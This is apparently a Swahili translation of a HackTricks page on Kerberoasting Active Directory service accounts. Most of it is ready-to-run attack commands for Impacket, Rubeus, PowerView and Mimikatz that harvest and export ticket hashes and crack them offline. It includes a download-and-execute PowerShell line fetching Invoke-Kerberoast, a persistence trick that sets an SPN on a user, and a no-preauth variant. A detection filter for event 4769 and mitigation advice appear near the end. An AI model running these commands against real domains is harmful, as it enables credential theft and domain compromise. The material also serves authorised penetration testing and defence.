# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha** mchakato wa kazi kwa kutumia zana za jamii za **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kerberoast

Kerberoast inalenga kupata **TGS tickets**, haswa zile zinazohusiana na huduma zinazofanya kazi chini ya akaunti za mtumiaji katika **Active Directory (AD)**, isipokuwa akaunti za kompyuta. Ufichuzi wa tiketi hizi hutumia funguo zinazotokana na **nywila za mtumiaji**, kuruhusu uwezekano wa **kuvunja siri nje ya mtandao**. Matumizi ya akaunti ya mtumiaji kama huduma inaonyeshwa na mali isiyokuwa tupu ya **"ServicePrincipalName"**.

Kwa kutekeleza **Kerberoast**, akaunti ya kikoa inayoweza kuomba **TGS tickets** ni muhimu; hata hivyo, mchakato huu hautaki **mamlaka maalum**, hivyo inapatikana kwa mtu yeyote mwenye **vyeti halali vya kikoa**.

### Alama muhimu:
- **Kerberoast** inalenga **TGS tickets** kwa **huduma za akaunti za mtumiaji** ndani ya **AD**.
- Tiketi zilizofichwa kwa kutumia funguo kutoka kwa **nywila za mtumiaji** zinaweza **kuvunjwa nje ya mtandao**.
- Huduma inatambuliwa na mali ya **ServicePrincipalName** ambayo sio tupu.
- **Hakuna mamlaka maalum** inahitajika, tu **vyeti halali vya kikoa**.

### **Shambulio**

{% hint style="warning" %}
Zana za **Kerberoast** kawaida huchagua **`RC4 encryption`** wakati wa kutekeleza shambulio na kuanzisha ombi la TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) na rahisi kuvunja nje ya mtandao kwa kutumia zana kama Hashcat kuliko algorithm nyingine za kuficha kama AES-128 na AES-256.\
Hashi za RC4 (aina 23) zinaanza na **`$krb5tgs$23$*`** wakati za AES-256 (aina 18) zinaanza na **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Vifaa vingi vikiwa na kipengele cha kudondosha watumiaji wanaoweza keroast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Tafuta watumiaji wanaoweza kufanyiwa Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Mbinu 1: Uliza TGS na itoe kutoka kumbukumbu**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Mbinu 2: Zana za kiotomatiki**

Kuna zana za kiotomatiki zinazopatikana ambazo zinaweza kutumika kwa urahisi kutekeleza shambulio la Kerberoasting. Zana hizi zinaweza kuchunguza na kuchanganua mfumo wa Active Directory ili kutambua akaunti za mtumiaji ambazo zinaweza kuwa hatarishi. Baadhi ya zana hizi zinaweza hata kutekeleza shambulio la Kerberoasting moja kwa moja na kutoa nywila zilizohifadhiwa kwa akaunti hizo. Ni muhimu kuzingatia kuwa matumizi ya zana hizi yanapaswa kufanywa kwa uangalifu na kwa idhini ya wamiliki wa mifumo husika.
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Wakati TGS inahitajika, tukio la Windows `4769 - Tiketi ya huduma ya Kerberos ilihitajika` inazalishwa.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** wa kazi zinazotumia zana za jamii za **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Kuvunja
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Uthabiti

Ikiwa una **idhini za kutosha** juu ya mtumiaji, unaweza **kuifanya iwe kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Unaweza kupata **zana** muhimu kwa mashambulizi ya **kerberoast** hapa: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Ikiwa unapata **kosa** hili kutoka kwa Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya wakati wako wa ndani, unahitaji kusawazisha mwenyeji na DC. Kuna chaguzi kadhaa:

* `ntpdate <IP ya DC>` - Imepitwa na wakati kuanzia Ubuntu 16.04
* `rdate -n <IP ya DC>`

### Kupunguza Athari

Kerberoasting inaweza kufanywa kwa kiwango kikubwa cha siri ikiwa inaweza kudukuliwa. Ili kugundua shughuli hii, tahadhari inapaswa kulipwa kwa **Kitambulisho cha Tukio la Usalama 4769**, ambayo inaonyesha kuwa tiketi ya Kerberos imeombwa. Walakini, kutokana na kawaida kubwa ya tukio hili, vichujio maalum lazima viwekwe ili kubainisha shughuli za shaka:

- Jina la huduma halipaswi kuwa **krbtgt**, kwani hii ni ombi la kawaida.
- Majina ya huduma yanayoishia na **$** yanapaswa kuepukwa ili kuepuka kujumuisha akaunti za mashine zinazotumiwa kwa huduma.
- Maombi kutoka kwa mashine yanapaswa kufutwa kwa kutoa nje majina ya akaunti yaliyopangwa kama **machine@domain**.
- Inapaswa kuzingatiwa ombi la tiketi lililofanikiwa tu, ambalo linatambuliwa na nambari ya kushindwa **'0x0'**.
- **Muhimu zaidi**, aina ya kusimbua tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kukabiliana na hatari ya Kerberoasting:

- Hakikisha kuwa **Nywila za Akaunti za Huduma ni ngumu kudhani**, kupendekeza urefu wa zaidi ya **herufi 25**.
- Tumia **Akaunti za Huduma Zilizosimamiwa**, ambazo zinatoa faida kama **mabadiliko ya nywila moja kwa moja** na **Usimamizi uliopewa Mamlaka ya Jina la Mwanzo la Huduma (SPN)**, kuimarisha usalama dhidi ya mashambulizi kama haya.

Kwa kutekeleza hatua hizi, taasisi zinaweza kupunguza kwa kiasi kikubwa hatari inayohusiana na Kerberoasting.


## Kerberoast bila akaunti ya kikoa

Mnamo **Septemba 2022**, njia mpya ya kudukua mfumo ilifichuliwa na mtafiti anayejulikana kama Charlie Clark, aliyeshiriki kupitia jukwaa lake [exploit.ph](https://exploit.ph/). Njia hii inaruhusu kupata **Tiketi za Huduma (ST)** kupitia ombi la **KRB_AS_REQ**, ambalo kwa kushangaza halihitaji udhibiti wowote juu ya akaunti yoyote ya Active Directory. Kimsingi, ikiwa mkuu wa mfumo amewekwa kwa njia ambayo hauhitaji uthibitishaji kabla—hali inayofanana na inayojulikana katika uwanja wa usalama wa mtandao kama shambulio la **AS-REP Roasting**—tabia hii inaweza kutumika kudanganya mchakato wa ombi. Hasa, kwa kubadilisha sifa ya **sname** ndani ya mwili wa ombi, mfumo unadanganywa kutoa **ST** badala ya Tiketi ya Kutoa Tiketi iliyofichwa kawaida (TGT).

Mbinu hii imeelezewa kikamilifu katika makala hii: [Machapisho ya blogu ya Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Lazima utoe orodha ya watumiaji kwa sababu hatuna akaunti halali ya kuuliza LDAP kwa kutumia mbinu hii.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py kutoka PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus kutoka PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Marejeo
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuendesha mchakato** wa kiotomatiki uliojengwa na zana za jamii **za hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
